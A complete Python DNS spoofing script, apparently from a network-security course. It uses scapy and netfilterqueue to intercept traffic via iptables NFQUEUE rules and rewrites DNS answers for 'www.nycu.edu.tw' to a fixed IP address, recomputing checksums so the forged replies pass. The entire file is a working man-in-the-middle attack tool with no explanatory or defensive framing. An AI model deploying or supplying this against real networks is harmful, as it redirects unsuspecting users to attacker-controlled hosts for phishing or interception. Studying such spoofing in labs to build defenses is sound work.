import netfilterqueue
import os
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        # print(scapy_packet.show())
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.nycu.edu.tw" in qname.decode():
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="140.113.207.246")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
os.system(
        'iptables -I FORWARD -j NFQUEUE --queue-num 0')
os.system(
        'iptables -I OUTPUT -j NFQUEUE --queue-num 0')
os.system(
        'iptables -I INPUT -j NFQUEUE --queue-num 0')
queue.run()
